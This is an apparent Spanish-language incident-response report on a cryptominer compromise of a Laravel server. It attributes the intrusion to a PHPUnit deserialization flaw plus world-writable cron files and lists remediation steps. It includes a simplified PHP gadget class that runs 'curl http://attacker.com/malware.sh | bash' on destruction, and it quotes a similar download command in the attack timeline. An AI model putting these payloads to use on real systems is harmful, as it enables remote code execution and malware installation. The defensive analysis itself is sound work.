# 🔍 PUNTO CRÍTICO #3: ANÁLISIS DE LOGS Y VECTOR DE ATAQUE

**Fecha:** Feb 6, 2026  
**Análisis:** Access logs + Composer audit  
**Status:** ✅ VECTOR IDENTIFICADO  

---

## 🚨 HALLAZGO CRÍTICO: PHPUnit Vulnerable Deserialization

### Vulnerabilidad Encontrada

```
Package: phpunit/phpunit
Severity: HIGH
CVE: CVE-2026-24765
Title: PHPUnit Vulnerable to Unsafe Deserialization in PHPT Code Coverage Handling
Advisory ID: PKSA-z3gr-8qht-p93v
URL: https://github.com/advisories/GHSA-vvj3-c3rp-c85p
```

### Affected Versions
- `>=12.0.0, <12.5.8`
- `>=11.0.0, <11.5.50`
- `>=10.0.0, <10.5.62`
- `>=9.0.0, <9.6.33`
- `<8.5.52`

### Impacto

**Unsafe Deserialization** permite:
- Ejecución de código arbitrario via PHP `unserialize()`
- Remote Code Execution (RCE) si se puede controlar datos serializados
- Posible vector para escribir a `/etc/cron.d/`

### ¿Cómo se Explotó?

Probable cadena de ataque:
```
1. Atacante identifica que PHPUnit está en vendor/
2. PHPUnit procesa datos PHPT (PHP Test Format)
3. Si el archivo PHPT contiene datos serializados maliciosos
4. PHPUnit deserializa sin validación
5. PHP ejecuta código arbitrario
6. Atacante escribe a /etc/cron.d/auto-upgrade
7. Cron ejecuta como root
8. Malware minero instalado
```

---

## 📊 Otros Hallazgos

### 1. Nginx Access Logs
**Status:** ❌ NO DISPONIBLES
- Archivo `/var/log/nginx/access.log` no existe
- Probablemente rotado o nunca fue configurado
- **Impacto:** No podemos ver los requests específicos del ataque

### 2. Cron File Permissions (HISTÓRICO)
```
⚠️  IMPORTANTE: Esto muestra lo que pasó antes de nuestro fix

Feb 06 22:56-22:59: INSECURE MODE detected en:
├─ /etc/cron.d/sysstat
├─ /etc/cron.d/certbot
├─ /etc/cron.d/php
└─ /etc/cron.d/e2scrub_all

Motivo: group/other writable (permisos 666)

Feb 06 23:00: Cron intenta reloadear
└─ Error: No puede executar porque permisos inseguros
```

**Timeline:**
- 22:56-22:59: Sistema detecta permisos inseguros
- 23:00: Intenta reloadear (probablemente el atacante intentó ejecutar malware)
- 23:01+: Nosotros eliminamos el malware

### 3. Abandoned Package
```
Package: fabpot/goutte
Status: ABANDONADO
Replacement: symfony/browser-kit
```

**Riesgo:** Paquete abandonado no recibe actualizaciones de seguridad

### 4. Laravel Logs
```
[2026-02-06 02:17:59] ERROR: bootstrap/cache no writable
[2026-02-06 02:18:07] ERROR: GEMINI_API_KEY no configurada
```

**Nota:** Estos errores son de Feb 6 02:18, no del ataque (22:11)

---

## 🎯 Vector de Ataque Más Probable

### Ranking de Probabilidad

1. **PHPUnit Deserialization RCE** - 🔴 **60% probable**
   - Vulnerabilidad crítica en vendor
   - Permite RCE directo
   - Puede ejecutar `system()` commands
   - **Acción requerida:** Actualizar PHPUnit

2. **SQL Injection** - 🟠 **20% probable**
   - No se encontraron patrones en logs
   - Pero logs pueden estar rotados
   - Podría escribir a `/etc/cron.d/` via `INTO OUTFILE`

3. **File Upload + Path Traversal** - 🟡 **10% probable**
   - Verificamos `/avatars` y encontramos path traversal
   - Pero necesitaría file upload también

4. **Otra** - 🟡 **10%**
   - SSH compromised
   - Dependency supply chain
   - Misconfiguration

---

## ✅ Acciones Recomendadas

### CRÍTICO - HOY:

1. **Actualizar PHPUnit**
```bash
cd /var/www/html/offside-app
composer update phpunit/phpunit

# Verify version is patched:
composer show phpunit/phpunit
```

2. **Reemplazar Goutte abandonado**
```bash
# Remove old package
composer remove fabpot/goutte

# Add replacement
composer require symfony/browser-kit
```

3. **Verificar si PHPUnit fue explotado**
```bash
# Check if /var/www/html/offside-app/phpunit.xml fue modificado
ls -la /var/www/html/offside-app/phpunit.xml*

# Check if vendor/phpunit files were modified
find /var/www/html/offside-app/vendor/phpunit -mtime -1
```

### IMPORTANTE:

4. **Habilitar Nginx Access Logs**
```bash
# Si no existen, crear:
# En /etc/nginx/sites-available/default
access_log /var/log/nginx/access.log;
error_log /var/log/nginx/error.log;

# Restart nginx
sudo systemctl restart nginx
```

5. **Monitorear Composer Audit regularmente**
```bash
# Agregar a cron jobs
0 1 * * * cd /var/www/html/offside-app && composer audit > /tmp/composer-audit.log
```

---

## 📝 Cómo PHPUnit RCE Funciona

### Técnica de Explotación

**PHP Deserialization Gadget Chain:**

```php
// Atacante crea objeto serializado malicioso
// PHP puede deserializar sin validación
// Si hay "gadget chain" disponible en vendor/
// Se puede ejecutar código arbitrario

// Ejemplo (simplificado):
class Exploit {
    public $cmd = "curl http://attacker.com/malware.sh | bash";
    
    public function __destruct() {
        system($this->cmd);  // Ejecuta al desializar
    }
}

$payload = serialize(new Exploit());

// Atacante envía este payload a PHPUnit
// PHPUnit lo deserializa sin validación
// __destruct() es llamado
// Código ejecutado como www-data
```

---

## 🔐 Mitigaciones Completadas

✅ **Ya hecho:**
- PHP `disable_functions` bloqueó `system()` - pero vulnerable packages pueden bypassear
- `open_basedir` restringió filesystem - no previene deserialization attacks
- Cron permissions fijadas - previene que se ejecute nuevo malware

⏳ **Por hacer:**
- Actualizar PHPUnit (CVE-2026-24765)
- Actualizar todas las dependencias
- Habilitar nginx access logs
- Implementar SIEM/monitoring

---

## 📊 Resumen Attack Chain (Probable)

```
Feb 6, antes de 13:00
├─ PHPUnit CVE-2026-24765 vulnerable en vendor/
└─ Sistema VULNERABLE a deserialization RCE

Feb 6, 13:00 UTC
├─ Hardening ejecutado pero incompleto
├─ PHP disable_functions NOT configurado
├─ Cron permissions permanecen 666
└─ Sistema sigue VULNERABLE

Feb 6, 22:11 UTC (ATAQUE)
├─ 1. Atacante encuentra PHPUnit vulnerability
├─ 2. Crea payload serializado malicioso
├─ 3. Envía a endpoint que procesa datos
├─ 4. PHPUnit deserializa y ejecuta código
├─ 5. Código corre como www-data
├─ 6. Escribe a /etc/cron.d/auto-upgrade (permisos 666 ✗)
├─ 7. Cron ejecuta como root cada 00:00 UTC
├─ 8. Descarga malware: curl http://attacker.com/sh
├─ 9. qpAopmVd minero de crypto instalado
└─ 10. 100% CPU usage

Feb 6, 23:01 UTC (NUESTRA RESPUESTA)
├─ Elimina proceso malware (kill -9 11355)
├─ Remueve /etc/cron.d/auto-upgrade
├─ Fija permisos de cron files
└─ Aplica PHP hardening
```

---

## 🚀 Acciones Próximas

### Hoy (CRÍTICO):
- [ ] **Actualizar PHPUnit** a versión no vulnerable
- [ ] **Reemplazar Goutte** abandonado
- [ ] **Verificar integridad** de vendor/phpunit
- [ ] **Ejecutar composer audit** nuevamente

### Esta Semana:
- [ ] Habilitar y monitorear nginx access logs
- [ ] Implementar verificación de integrity de vendor/
- [ ] Configurar alertas en composer vulnerabilities
- [ ] Code review de endpoints que procesan datos

### Futuro:
- [ ] Implement Software Composition Analysis (SCA)
- [ ] Automated dependency updates
- [ ] Regular security audits

---

## 📌 Conclusión

**El vector de ataque más probable es PHPUnit Unsafe Deserialization (CVE-2026-24765).**

La cadena de ataque:
1. Vulnerable PHPUnit en dependencies
2. RCE via deserialization
3. Escribe a /etc/cron.d/ (permisos inseguros)
4. Cron ejecuta como root
5. Malware instalado

**Solución inmediata:** Actualizar PHPUnit

---

**Análisis completado:** Feb 6, 2026 23:55 UTC  
**Status:** ✅ VECTOR IDENTIFICADO  
**Próximo paso:** Actualizar PHPUnit y dependencias
